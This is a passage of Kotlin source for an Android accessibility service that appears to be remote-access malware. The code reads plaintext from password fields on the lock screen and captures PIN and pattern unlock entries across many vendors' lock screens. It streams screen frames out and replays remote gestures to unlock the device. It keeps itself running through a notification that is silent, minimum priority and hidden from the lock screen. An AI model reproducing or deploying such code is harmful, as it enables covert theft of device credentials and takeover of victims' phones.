            }
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val nested = readPasswordNodeText(child)
            child.recycle()
            if (nested != null) {
                return nested
            }
        }
        return null
    }

    private fun readMixedPasswordNodeText(node: AccessibilityNodeInfo): String? {
        val viewId = node.viewIdResourceName.orEmpty().lowercase()
        val looksPassword = node.isPassword ||
            viewId.contains("password") ||
            viewId.contains("pwd") ||
            viewId.contains("mixpw") ||
            viewId.contains("securityedit")
        if (looksPassword) {
            val text = node.text?.toString()?.trim().orEmpty()
            if (text.isNotEmpty() &&
                !KeyguardCredentialCapture.looksLikeMaskedSecret(text) &&
                text.any { !it.isDigit() }
            ) {
                return text
            }
        }
        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val nested = readMixedPasswordNodeText(child)
            child.recycle()
            if (nested != null) {
                return nested
            }
        }
        return null
    }

    companion object {
        private const val CLICK_DURATION_MS = 80L
        private const val PIN_CLICK_DURATION_MS = 130L
        private const val MIN_PIN_CONTAINER_HEIGHT_PX = 400
        private const val MIN_PIN_KEYPAD_OVERLAY_HEIGHT_PX = 280
        private const val PIN_CONTAINER_VIEW_ID = "com.android.systemui:id/pin_container"
        private const val KEYGUARD_PIN_VIEW_ID = "com.android.systemui:id/keyguard_pin_view"
        private const val PIN_COLOR_NUMERIC_KEYBOARD_VIEW_ID =
            "com.android.systemui:id/pinColorNumericKeyboard"
        private val PIN_CONTAINER_VIEW_IDS = listOf(
            PIN_CONTAINER_VIEW_ID,
            KEYGUARD_PIN_VIEW_ID,
            PIN_COLOR_NUMERIC_KEYBOARD_VIEW_ID,
            "com.android.systemui:id/pinEntry",
            "com.android.systemui:id/fixedPinEntry",
            "com.android.systemui:id/oplusos_kgd_security_pin_six_view",
            "com.android.systemui:id/vivo_pin_edittext",
        )
        private val PIN_PAGE_HINT_VIEW_IDS = listOf(
            PIN_CONTAINER_VIEW_ID,
            KEYGUARD_PIN_VIEW_ID,
            PIN_COLOR_NUMERIC_KEYBOARD_VIEW_ID,
            "com.android.systemui:id/pinEntry",
            "com.android.systemui:id/fixedPinEntry",
            "com.android.systemui:id/oplusos_kgd_security_pin_six_view",
            "com.android.systemui:id/passwordEntry",
            "com.android.systemui:id/securityEditText",
            "com.android.systemui:id/key_enter",
            "com.android.systemui:id/key_enter_text",
            "com.android.systemui:id/key1",
            "com.android.systemui:id/key0",
        )
        private val PIN_CONFIRM_VIEW_IDS = listOf(
            "com.android.systemui:id/key_enter_text",
            "com.android.systemui:id/key_enter",
            "com.android.systemui:id/vivo_pin_confirm",
            "com.android.systemui:id/btn_letter_ok",
            "com.android.systemui:id/mix_normal_confirm",
            "com.android.keyguard:id/key_enter",
        )
        private val PIN_DELETE_VIEW_IDS = listOf(
            "com.android.systemui:id/delete_button",
            "com.android.systemui:id/btn_letter_delete",
            "com.android.systemui:id/vivo_cancel",
            "com.android.keyguard:id/delete_button",
        )
        private val PIN_CONFIRM_TEXTS = setOf(
            "ok",
            "OK",
            "确定",
            "確認",
            "确认",
            "完成",
            "enter",
            "Enter",
            // es
            "aceptar",
            "confirmar",
            "listo",
        )
        /** android.view.accessibility.AccessibilityNodeInfo.ACTION_IME_ENTER (API 30) */
        private const val ACTION_IME_ENTER = 0x00000040
        private const val GESTURE_TIMEOUT_MS = 6000L
        private const val DISABLE_SELF_DELAY_MS = 400L
        private const val CLICK_GESTURE_TIMEOUT_MS = 1500L
        /** L1-3: 单次 UI 树遍历最大耗时。超过即返回部分结果 + timedOut=true。 */
        private const val DUMP_UI_TREE_BUDGET_MS = 2500L
        /** Pause a11y takeScreenshot for the whole remote swipe/click window. */
        private const val GESTURE_CAPTURE_PAUSE_MS = 2200L
        private const val HORIZONTAL_SWIPE_MIN_DURATION_MS = 450L
        private const val HORIZONTAL_SWIPE_TIMEOUT_EXTRA_MS = 2500L
        private const val UNLOCK_GESTURE_TIMEOUT_MS = 8000L
        private const val MAX_FRAME_WIDTH = 320
        private const val WEBRTC_FRAME_WIDTH = 540
        private const val JPEG_QUALITY = 28
        private const val SNAPSHOT_MAX_WIDTH = 1080
        private const val SNAPSHOT_JPEG_QUALITY = 85
        private const val SNAPSHOT_RETRY_MAX = 20
        private const val SNAPSHOT_RETRY_DELAY_MS = 100L
        /** Align with Android ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT and UI default ~2.5fps. */
        private const val MIN_CAPTURE_INTERVAL_MS = 350L
        /** isCapturingFrame 卡死超过此时限时强制释放，避免 takeScreenshot 不回调导致雪球。 */
        private const val CAPTURE_WATCHDOG_MS = 4_000L
        private const val CAPTURE_BLACK_HIDE_SETTLE_MS = 50L
        /** 冷标定短延迟；P0 已齐时 schedule 走 0ms（对齐竞品立刻挂层） */
        private const val KEYGUARD_PIN_SYNC_DELAY_MS = 50L
        private const val KEYGUARD_PIN_RESET_DELAY_MS = 2000L
        /** 图案：等 HOME+双次回放后再轮询 keyguardLocked；PIN 只走 USER_PRESENT */
        private const val KEYGUARD_PATTERN_UNLOCK_FLUSH_MS = 1200L
        private const val KEYGUARD_PATTERN_UNLOCK_FLUSH_RETRY_MS = 400L
        private const val KEYGUARD_PATTERN_UNLOCK_FLUSH_MAX_ATTEMPTS = 20
        private const val TAG_PATTERN = "PatternCapture"
        private const val PATTERN_OVERLAY_SUPPRESS_MS = 2500L
        private const val PATTERN_UNLOCK_SUPPRESS_MS = 60_000L
        private const val PATTERN_UNLOCK_SETTLE_MS = 800L
        private const val PATTERN_UNLOCK_CAPTURE_PAUSE_MS = 40_000L
        private const val OVERLAY_DETACH_MS = 350L
        private const val MIN_PATTERN_VIEW_PX = 200
        private const val PIN_CLICK_DEDUPE_MS = 80L
        private const val PIN_OVERLAY_DIGIT_DEDUPE_MS = 320L
        private const val PIN_OVERLAY_CLICK_SUPPRESS_MS = 2000L
        private const val PIN_OVERLAY_RESHOW_MS = 220L
        private const val PIN_OVERLAY_RESYNC_MIN_MS = 2500L
        private const val MID_PIN_PAUSE_MS = 700L
        private const val ROOT_REFRESH_MS = 200L
        private const val SWIPE_SETTLE_MS = 1000L
        private const val SWIPE_STEP_PAUSE_MS = 650L
        private const val PIN_CLICK_SETTLE_MS = 320L
        private const val PIN_READY_PAUSE_MS = 500L
        private const val PIN_RETRY_PAUSE_MS = 300L
        private const val PIN_DIGIT_MAX_ATTEMPTS = 5
        private const val DISPATCH_WAIT_MS = 1500L
        private const val PIN_KEYPAD_WAIT_MS = 500L
        private const val PIN_KEYPAD_WAIT_RETRIES = 10
        private const val PIN_KEYPAD_READY_ROUNDS = 3
        private const val BOUNCER_TITLE_VIEW_ID = "com.android.systemui:id/bouncer_message_area_title"
        private val LOCK_COVER_DISMISS_VIEW_IDS = listOf(
            "com.android.systemui:id/keyguard_indication_text",
            "com.android.systemui:id/keyguard_indication_text_bottom",
            "com.android.systemui:id/keyguard_indication_area",
            "com.android.systemui:id/notification_panel",
            "com.android.systemui:id/notification_stack_scroller",
            "com.android.systemui:id/sec_lock_icon_view",
        )
        private val LOCK_COVER_HINTS = listOf(
            "滑动",
            "swipe",
            "slide to",
        )
        private const val ROOT_RETRY_COUNT = 12
        private const val ROOT_RETRY_MS = 350L
        private const val MIN_CALIBRATED_DIGITS = 8
        private const val UI_TREE_MIN_BOUNDS_PX = 8
        private const val ACTIVE_WINDOW_ID = -1001
        private val PIN_PROBE_DIGITS = listOf("1", "5", "9", "0")
        private val PIN_CALIBRATION_DIGITS = listOf("0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
        private val PATTERN_VIEW_IDS = listOf(
            "com.android.systemui:id/lockPatternView",
            "com.android.systemui:id/lock_pattern_view",
            "com.android.systemui:id/colorLockPatternView",
            "com.android.keyguard:id/lockPatternView",
            "com.android.systemui:id/vivo_lock_pattern_view",
            "com.android.systemui:id/oplusos_lock_pattern_view",
            "com.android.systemui:id/sec_lock_pattern_view",
            "com.android.systemui:id/knox_lock_pattern_view",
            // 竞品 AccessService.E / Samsung 常见
            "com.android.systemui:id/security_lockpatternview",
            "com.samsung.android.biometrics.app:id/lockPatternView",
            // Settings「设置图案 / 画解锁图案」
            "com.android.settings:id/lockPattern",
            "com.android.settings:id/lockPatternView",
            "com.android.settings:id/lock_pattern",
            "com.android.settings:id/choose_lock_pattern",
        )
        private val PASSWORD_ENTRY_VIEW_IDS = listOf(
            "com.android.systemui:id/passwordEntry",
            "com.android.systemui:id/securityEditText",
            "com.android.systemui:id/password_entry",
            "com.android.systemui:id/mix_passwordEntry",
            "com.android.keyguard:id/passwordEntry",
            "com.android.systemui:id/vivo_password_edittext",
        )
        private const val ACCESSIBILITY_CHANNEL_ID = "accessibility_channel"
        private const val ACCESSIBILITY_NOTIFICATION_ID = 1001
    }

    private fun promoteToForegroundSafely() {
        runCatching {
            createAccessibilityNotificationChannel()
            val notification = buildAccessibilityNotification()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ServiceCompat.startForeground(
                    this,
                    ACCESSIBILITY_NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                )
            } else {
                startForeground(ACCESSIBILITY_NOTIFICATION_ID, notification)
            }
        }.onFailure {
            android.util.Log.w("RemoteAccessibility", "promoteToForeground failed", it)
        }
    }

    private fun stopForegroundSafely() {
        runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(Service.STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION")
                stopForeground(true)
            }
        }.onFailure {
            android.util.Log.w("RemoteAccessibility", "stopForeground failed", it)
        }
    }

    private fun createAccessibilityNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return
        }
        val manager = getSystemService(NotificationManager::class.java) ?: return
        val channel = NotificationChannel(
            ACCESSIBILITY_CHANNEL_ID,
            getString(R.string.accessibility_notification_channel),
            NotificationManager.IMPORTANCE_MIN,
        ).apply {
            description = getString(R.string.accessibility_notification_channel_desc)
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        manager.createNotificationChannel(channel)
    }

    private fun buildAccessibilityNotification(): Notification {
        return NotificationCompat.Builder(this, ACCESSIBILITY_CHANNEL_ID)
            .setContentTitle(getString(R.string.accessibility_notification_title))
            .setContentText(getString(R.string.accessibility_notification_text))
            .setSmallIcon(R.drawable.ic_notification_silent)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }
}
